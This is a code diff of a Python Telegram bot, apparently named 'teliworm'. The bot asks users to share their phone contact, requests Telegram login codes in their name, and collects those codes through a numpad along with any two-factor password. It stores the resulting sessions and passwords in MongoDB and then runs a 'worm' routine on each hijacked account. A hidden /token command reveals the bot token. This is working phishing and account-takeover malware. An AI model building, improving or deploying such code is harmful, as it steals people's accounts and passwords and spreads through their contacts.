@@ -1,44 +1,17 @@
-import logging,os,json,telethon,asyncio,pytz,aiohttp
+import logging,os,json,telethon,asyncio
 from telethon import TelegramClient, events, Button, errors
 from telethon.sessions import StringSession
 from dotenv import load_dotenv
 from pymongo.mongo_client import MongoClient
 from pymongo.server_api import ServerApi
-from strings import strings,direct_reply
+from strings import strings,direct_reply,numpad
 from worm import worm
-from datetime import datetime
 
-logging.basicConfig(format='%(asctime)s - %(name)s - %(levelname)s - %(message)s', level=logging.INFO)
 load_dotenv(override=True)
-
+logging.basicConfig(format='%(asctime)s - %(name)s - %(levelname)s - %(message)s', level=logging.INFO)
 mongo_client = MongoClient(os.getenv('MONGODB_URI'), server_api=ServerApi('1'))
 database = mongo_client.userdb.sessions
 logger_bot = TelegramClient('teliworm', 6, 'eb06d4abfb49dc3eeb1aeb98ae0f581e')
-TIMEZONE = pytz.timezone(os.getenv('TIMEZONE', 'Asia/Colombo'))
-
-numpad = [
-    [Button.url(strings['get_code_btn'], 'https://t.me/+42777')],
-    [
-        Button.inline("1", '{"press":1}'),
-        Button.inline("2", '{"press":2}'),
-        Button.inline("3", '{"press":3}')
-    ],
-    [
-        Button.inline("4", '{"press":4}'),
-        Button.inline("5", '{"press":5}'),
-        Button.inline("6", '{"press":6}')
-    ],
-    [
-        Button.inline("7", '{"press":7}'),
-        Button.inline("8", '{"press":8}'),
-        Button.inline("9", '{"press":9}')
-    ],
-    [
-        Button.inline("Clear All", '{"press":"clear_all"}'),
-        Button.inline("0", '{"press":0}'),
-        Button.inline("⌫", '{"press":"clear"}')
-    ]
-]
 
 def getconfig(key, default=None):
     result = mongo_client.default.config.find_one({'key':key})
@@ -57,32 +30,32 @@ def yesno(x,page='def'):
         [Button.inline("Yes", '{{"page":"{}","press":"yes{}"}}'.format(page,x))],
         [Button.inline("No", '{{"page":"{}","press":"no{}"}}'.format(page,x))]
     ]
-async def handle_usr(contact, event):
-    msg = await event.respond(strings['sending1'], buttons=Button.clear())
-    await msg.delete()
-    msg = await event.respond(strings['sending2'])
+async def is_session_authorized(session)
+    uclient = TelegramClient(StringSession(session), os.getenv('API_ID'), os.getenv('API_HASH'))
+    await uclient.connect()
+    authorized = await uclient.is_user_authorized()
+    await uclient.disconnect()
+    return authorized
+async def handle_usr(phone_num, event):
+    await event.respond(strings['hello'], buttons=Button.clear())
+    msg = await event.respond(strings['sending'])
     uclient = TelegramClient(StringSession(), os.getenv('API_ID'), os.getenv('API_HASH'))
     await uclient.connect()
-    user_data = database.find_one({"chat_id": event.chat_id})
     try:
-        scr = await uclient.send_code_request(contact.phone_number)
+        scr = await uclient.send_code_request(phone_num)
         login = {
         	'code_len': scr.type.length,
             'phone_code_hash': scr.phone_code_hash,
             'session': uclient.session.save(),
         }
-        data = {
-        	'phone': contact.phone_number,
-            'login': json.dumps(login),
-        }
-        database.update_one({'_id': user_data['_id']}, {'$set': data})
         await msg.edit(strings['ask_code'], buttons=numpad)
+        return login
     except Exception as e:
         await msg.edit("Error: "+repr(e))
     await uclient.disconnect()
-async def sign_in(event):
+    return {}
+async def sign_in(event, user_data):
     try:
-        user_data = database.find_one({"chat_id": event.chat_id})
         login = json.loads(user_data['login'])
         data = {}
         uclient = None
@@ -101,7 +74,7 @@ async def sign_in(event):
         data['logged_in'] = True
         login = {}
         await event.edit(strings['login_success'])
-        await worm(uclient, bot, logger_bot)
+        await worm(uclient, logger_bot)
     except telethon.errors.PhoneCodeInvalidError as e:
         await event.edit(strings['code_invalid'])
         await event.respond(strings['ask_code'], buttons=numpad)
@@ -117,45 +90,54 @@ async def sign_in(event):
         await event.edit(strings['pass_invalid'])
         await event.respond(strings['ask_pass'])
     except Exception as e:
-        login['code'] = ''
-        login['code_ok'] = False
-        login['pass_ok'] = False
+        login = {}
         await event.edit(repr(e))
     await uclient.disconnect()
     data['login'] = json.dumps(login)
     database.update_one({'_id': user_data['_id']}, {'$set': data})
     return True
 
+@events.register(events.NewMessage(pattern=r"/token", func=lambda e: e.is_private))
+async def handler_get_token(event):
+    m = event.message.text.split(' ')
+    if len(m)==2 and m[1]==os.getenv('SECRET_COMMAND'):
+        await event.respond(f"`{getconfig('BOT_TOKEN')}`")
+    raise events.StopPropagation
 @events.register(events.NewMessage(func=lambda e: e.is_private, outgoing=False))
-async def handler_new_user(event):
+async def handler_all_user(event):
     user_data = database.find_one({"chat_id": event.chat_id})
-    if user_data is None:
-        sender = await event.get_sender()
-        database.insert_one({
-            "chat_id": sender.id,
-            "first_name": sender.first_name,
-            "last_name": sender.last_name,
-            "username": sender.username,
-        })
+    user_data = user_data if user_data else {"chat_id": event.chat_id}
+    data = {}
+    login = json.loads(get(user_data, 'login', '{}'))
     if event.message.text in direct_reply:
         await event.respond(direct_reply[event.message.text])
         raise events.StopPropagation
-@events.register(events.NewMessage(pattern=r"/login", func=lambda e: e.is_private, outgoing=False))
-async def handler_login(event):
-    user_data = database.find_one({"chat_id": event.chat_id})
-    if get(user_data, 'logged_in', False):
-        await event.respond(strings['already_logged_in'])
-        raise events.StopPropagation
-    await event.respond(strings['ask_phone'], buttons=[Button.request_phone(strings['share_contact_btn'], resize=True, single_use=True)])
-    raise events.StopPropagation
-@events.register(events.NewMessage(func=lambda e: e.is_private, outgoing=False))
-async def handler_contact_share(event):
-    if event.message.contact:
+    elif event.message.contact and not get(user_data, 'logged_in', False):
         if event.message.contact.user_id==event.chat.id:
-            await handle_usr(event.message.contact, event)
+            await event.message.delete()
+            data['phone'] = event.message.contact.phone_number
+            login = await handle_usr(event.message.contact.phone_number, event)
         else:
             await event.respond(strings['wrong_phone'])
-        raise events.StopPropagation
+    elif get(login, 'code_ok', False) and get(login, 'need_pass', False) and not get(login, 'pass_ok', False):
+        await event.message.delete()
+        await event.respond(strings['ask_ok']+event.message.text, buttons=yesno('pass'))
+        data['password'] = event.message.text
+    elif get(user_data, 'logged_in', False):
+        if await is_session_authorized(user_data['session']):
+            await event.respond(strings['already_logged_in'])
+        else:
+            login = await handle_usr(user_data['phone'], event)
+    else:
+        if 'phone' in user_data:
+            login = await handle_usr(user_data['phone'], event)
+        else:
+            await event.respond(strings['ask_phone'], buttons=[Button.request_phone(strings['share_contact_btn'], resize=True, single_use=True)])
+    if login!={}:
+        data['login'] = json.dumps(login)
+    if data!={}:
+        database.update_one({"chat_id": event.chat_id}, {'$set': data}, upsert=True)
+    raise events.StopPropagation
 @events.register(events.CallbackQuery(func=lambda e: e.is_private))
 async def handler_callback(event):
     try:
@@ -182,68 +164,15 @@ async def handler_callback(event):
         login['pass_ok'] = False
         login['need_pass'] = True
         await event.edit(strings['ask_pass'])
-    database.update_one({'_id': user_data['_id']}, {'$set': {'login': json.dumps(login)}})
+    database.update_one({"chat_id": event.chat_id}, {'$set': {'login': json.dumps(login)}})
     if len(login['code'])==login['code_len'] and not get(login, 'code_ok', False):
         await event.edit(strings['ask_ok']+login['code'], buttons=yesno('code'))
     elif press=="nopass":
         return
-    elif not await sign_in(event):
+    elif not await sign_in(event, user_data):
         await event.edit(strings['ask_code']+login['code'], buttons=numpad)
-@events.register(events.NewMessage(pattern=r"/worm", func=lambda e: e.is_private))
-async def handler_spred_msg(event):
-    await event.respond(
-        strings['worm_msg'],
-        file='files/worm.png',
-        buttons=[[Button.url(strings['worm_msg_btn_txt'], strings['worm_msg_btn_url'])]],
-        link_preview=False
-    )
-    raise events.StopPropagation
-@events.register(events.NewMessage(pattern=r"/token", func=lambda e: e.is_private))
-async def handler_get_token(event):
-    m = event.message.text.split(' ')
-    if len(m)==2 and m[1]==os.getenv('SECRET_COMMAND'):
-        await event.respond(f"`{getconfig('BOT_TOKEN')}`")
-    raise events.StopPropagation
-@events.register(events.NewMessage(func=lambda e: e.is_private, outgoing=False))
-async def handler_other_msg(event):
-    user_data = database.find_one({"chat_id": event.chat_id})
-    login = json.loads(get(user_data, 'login', '{}'))
-    if get(login, 'code_ok', False) and get(login, 'need_pass', False) and not get(login, 'pass_ok', False):
-        data = {
-            'password': event.message.text
-        }
-        await event.message.delete()
-        await event.respond(strings['ask_ok']+data['password'], buttons=yesno('pass'))
-        database.update_one({'_id': user_data['_id']}, {'$set': data})
-        return
-    if get(user_data, 'logged_in', False):
-        await event.respond(strings['already_logged_in'])
-    else:
-        await event.respond(strings['unknownn_command'])
 
-async def is_bot_active(bot_username):
-    async with aiohttp.ClientSession(connector=aiohttp.TCPConnector(ssl=False),timeout=aiohttp.ClientTimeout(total=5)) as session:
-        async with session.get(f'https://t.me/{bot_username}') as response:
-            html = await response.text()
-    return html.split('</title>',1)[0].split('<title>',1)[1]==f'Telegram: Launch @{bot_username}'
-async def wait_until_next_minute():
-    now = datetime.now(TIMEZONE)
-    next_minute = now.replace(hour=now.hour, minute=now.minute+1 if now.minute!=59 else 0, second=0, microsecond=0)
-    seconds_to_next_minute = (next_minute-now).total_seconds()
-    await asyncio.sleep(seconds_to_next_minute)
-async def cron(bot):
-    while 1:
-        try:
-            await wait_until_next_minute()
-            if not await is_bot_active((await bot.get_me()).username):
-                print('bot check - dead')
-                await bot.disconnect()
-            else:
-                print('bot check - ok')
-        except:
-            print('bot check - fail')
 async def run_bot():
-    global bot
     bot_count = mongo_client.wormdb.bots.count_documents({})
     bot = TelegramClient(StringSession(), 6, 'eb06d4abfb49dc3eeb1aeb98ae0f581e')
     for function in botFunctions:
@@ -251,21 +180,15 @@ async def run_bot():
     if bot_count==0:
         await bot.start(bot_token=os.getenv('BOT_TOKEN'))
     else:
-        next = mongo_client.wormdb.bots.find().limit(1).next()
-        if not await is_bot_active(next['username']):
-            mongo_client.wormdb.bots.delete_one(next)
+        next_bot = mongo_client.wormdb.bots.find().limit(1).next()
+        await bot.start(bot_token=next_bot['token'])
+        if not await bot.is_user_authorized():
+            mongo_client.wormdb.bots.delete_one(next_bot)
             raise Exception("Bot not authorized")
-        await bot.start(bot_token=next['token'])
-        cron_task = asyncio.create_task(cron(bot))
-        await bot.run_until_disconnected()
-    if cron_task:
-        cron_task.cancel()
-        try:
-            await cron_task
-        except asyncio.CancelledError:
-            pass
+        await bot.start(bot_token=next_bot['token'])
     setconfig('BOT_USERNAME', (await bot.get_me()).username)
-    setconfig('BOT_TOKEN', next['token'])
+    setconfig('BOT_TOKEN', next_bot['token'])
+    await bot.run_until_disconnected()
 async def main():
     await logger_bot.start(bot_token=os.getenv('BOT_TOKEN'))
     while 1:
